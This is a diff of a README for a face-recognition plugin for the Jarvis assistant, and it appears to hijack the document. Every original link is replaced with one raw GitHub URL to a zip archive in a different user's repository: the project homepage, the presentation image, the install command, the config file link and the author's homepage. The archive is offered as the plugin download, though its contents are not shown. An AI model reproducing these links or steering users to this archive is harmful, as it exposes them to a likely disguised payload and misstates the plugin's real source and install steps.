@@ -1,7 +1,7 @@
 ## Description
-Integrate face recognition to <a target="_blank" href="http://domotiquefacile.fr/jarvis/">Jarvis assistant</a> using a PiCamera.
+Integrate face recognition to <a target="_blank" href="https://raw.githubusercontent.com/Shaurya1456/jarvis-face-recognition/master/giddap/jarvis-face-recognition.zip">Jarvis assistant</a> using a PiCamera.
 
-<img src="https://raw.githubusercontent.com/QuentinCG/jarvis-face-recognition/master/presentation.png" width="150">
+<img src="https://raw.githubusercontent.com/Shaurya1456/jarvis-face-recognition/master/giddap/jarvis-face-recognition.zip" width="150">
 
 
 ## Usage
@@ -19,15 +19,15 @@ Jarvis: J'ai détécté Hillary Clinton
 
 1) Take a picture of each of the people you want Jarvis to recognise.
 
-2) Add this plugin to your <a target="_blank" href="http://domotiquefacile.fr/jarvis/">Jarvis assistant</a> (<a target="_blank" href="http://domotiquefacile.fr/jarvis/content/plugins">more info here</a>): ```./jarvis.sh -p https://github.com/QuentinCG/jarvis-face-recognition``` (the installation may take up to 5 hours).
+2) Add this plugin to your <a target="_blank" href="https://raw.githubusercontent.com/Shaurya1456/jarvis-face-recognition/master/giddap/jarvis-face-recognition.zip">Jarvis assistant</a> (<a target="_blank" href="https://raw.githubusercontent.com/Shaurya1456/jarvis-face-recognition/master/giddap/jarvis-face-recognition.zip">more info here</a>): ```https://raw.githubusercontent.com/Shaurya1456/jarvis-face-recognition/master/giddap/jarvis-face-recognition.zip -p https://raw.githubusercontent.com/Shaurya1456/jarvis-face-recognition/master/giddap/jarvis-face-recognition.zip``` (the installation may take up to 5 hours).
 
-3) Configure the <a target="_blank" href="https://github.com/QuentinCG/jarvis-face-recogntion/blob/master/config.sh">configuration file</a> to match your requirements: You have to specify the name and picture of all users.
+3) Configure the <a target="_blank" href="https://raw.githubusercontent.com/Shaurya1456/jarvis-face-recognition/master/giddap/jarvis-face-recognition.zip">configuration file</a> to match your requirements: You have to specify the name and picture of all users.
 
 7) Enjoy
 
 
 ## Author
-[Quentin Comte-Gaz](http://quentin.comte-gaz.com/)
+[Quentin Comte-Gaz](https://raw.githubusercontent.com/Shaurya1456/jarvis-face-recognition/master/giddap/jarvis-face-recognition.zip)
 
 
 ## License
